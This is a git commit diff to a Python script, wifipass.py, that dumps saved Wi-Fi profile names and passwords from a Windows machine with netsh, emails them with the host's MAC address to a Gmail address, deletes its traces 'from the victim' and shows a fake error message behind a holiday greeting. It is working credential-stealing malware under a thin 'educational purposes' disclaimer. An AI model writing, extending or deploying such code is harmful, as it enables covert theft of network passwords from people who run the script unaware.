d230222b1fc5b9c5729c7e4f22c857947a3e577c
Astranot <81610847+Astranot@users.noreply.github.com>
2021-11-27 03:01:09 +0800

    Update mac
    Update
    Ex. "This data received from 00:00:00:00:00:00"

--- wifipass.py
+++ wifipass.py
@@ -2,7 +2,7 @@
 #########################
 # Copyright of astranot #
 # github.com/astranot   #
-# kenshiin33@gmail.com  #
+# fikrichuck@gmail.com  #
 # twitter/fiekzzlala    #
 #########################
 
@@ -16,7 +16,7 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 import os
-
+import getmac
 # This python script is solely for educational purposes only
 # Everything is under the user's responsibility
 # Written at 17/11/2021
@@ -29,7 +29,8 @@ print("Happy holidays guys! Wish you all the best!\n")
 print("Please wait this might take a while")
 
 # list of wifi names and password
-dictionary = []
+dictionary = [] # password bank
+kamus = [] # list of wifi and password
 
 # run the command netsh wlan show profiles and decode the results in utf-8 decoder
 bytesData = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], stdout=subprocess.PIPE)
@@ -67,25 +68,46 @@ for i in profiles:
             passwd = ""
 
     # copy the wifi name and password to the dictionary
-    dictionary.append(i)
+    kamus.append(i)
+    kamus.append(passwd)
     dictionary.append(passwd)
 
 # determine the length of the dictionary to change the list to 2D list
 # change the shape of the list from 1D to 2D list
-length = int(len(dictionary) / 2)
-string = np.array(dictionary).reshape(length, 2)
+length = int(len(kamus) / 2)
+string = np.array(kamus).reshape(length, 2)
 
+ping = '\n'.join(str(item) for innerlist in string for item in innerlist)
+
+#print(ping)
+#print(type(ping))
+
+def listToString(s): 
+    
+    # initialize an empty string
+    str1 = "\n" 
+    
+    # return string  
+    return (str1.join(s))
+        
+m = listToString(dictionary)
+#print(m)
 # assign the list to string in wifi
-wifi = str(string)
+
+wifi = str(kamus)
+#print(wifi)
 
 # the function will send the wifi string to the predator / user
-def email_alert(subject, body, to):
+def email_alert(fromMac, body, to):
 
     # assign MIMEMultipart() function to msg
     msg = MIMEMultipart()
     # assign the string to the body of email
     msg.attach(MIMEText(body, 'plain'))
     # assign title or subject to the subject of the email
+
+    subject = 'Password wifi from ' + fromMac
+
     msg['subject'] = subject
     # determine the receiver of the email
     msg['to'] = to
@@ -97,10 +119,10 @@ def email_alert(subject, body, to):
     # Put your password in the password section
     # **NOTE**
     # This is not your regular gmail password
-    # To gain the password you must active the 2 factor authentication
+    # To gain the password you must activate the 2 factor authentication
     # Activate the 'Other' in the app password
     # Gain the generated password in the section
-    password = "password"
+    password = "user_password"
 
 
     # assign wifi dictionary to filename
@@ -143,15 +165,18 @@ def wifiTxt(wifi):
     # close file
     textFile.close()
 
+mac = getmac.get_mac_address()
+    
+
 # function call
-wifiTxt(wifi)
-email_alert("ezgetWifi", wifi, "receiver@gmail.com")
+wifiTxt(m)
+email_alert(mac, wifi, "receiver@gmail.com")
 
 # remove the ding.txt from the victim
 if os.path.exists('ding.txt'):
     os.remove('ding.txt')
 
 # clear screen and exit the program
-os.system('cls')
+#os.system('cls')
 print("Something went wrong :(")
 input("Press any key to continue")
